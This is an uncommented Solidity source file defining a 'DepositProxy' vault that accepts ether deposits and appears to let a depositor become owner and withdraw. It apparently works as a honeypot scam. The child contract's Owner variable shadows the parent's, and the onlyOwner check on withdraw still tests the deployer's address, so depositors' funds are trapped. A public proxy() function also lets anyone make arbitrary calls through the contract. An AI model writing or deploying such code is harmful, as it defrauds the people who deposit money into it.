pragma solidity ^0.4.24;
contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; }
    address Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner { 
        Owner = _owner; 
        emit OwnershipTransferred(_owner);
    }

    function proxy(address target, bytes data) public payable {        
        target.call.value(msg.value)(data); 
        emit ProxyCalled(target, msg.value, data);
    }

    event OwnershipTransferred(address indexed newOwner);
    event ProxyCalled(address indexed target, uint256 value, bytes data);
}
contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            emit VaultCreated(msg.sender);
            deposit();
        }
    }

    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
            emit DepositMade(msg.sender, msg.value);
        }
    }

    function withdraw(uint256 amount) public onlyOwner {
        if (amount > 0 && Deposits[msg.sender] >= amount) {
            msg.sender.transfer(amount);
            emit Withdrawn(msg.sender, amount);
        }
    }

    event VaultCreated(address indexed owner);
    event DepositMade(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
}
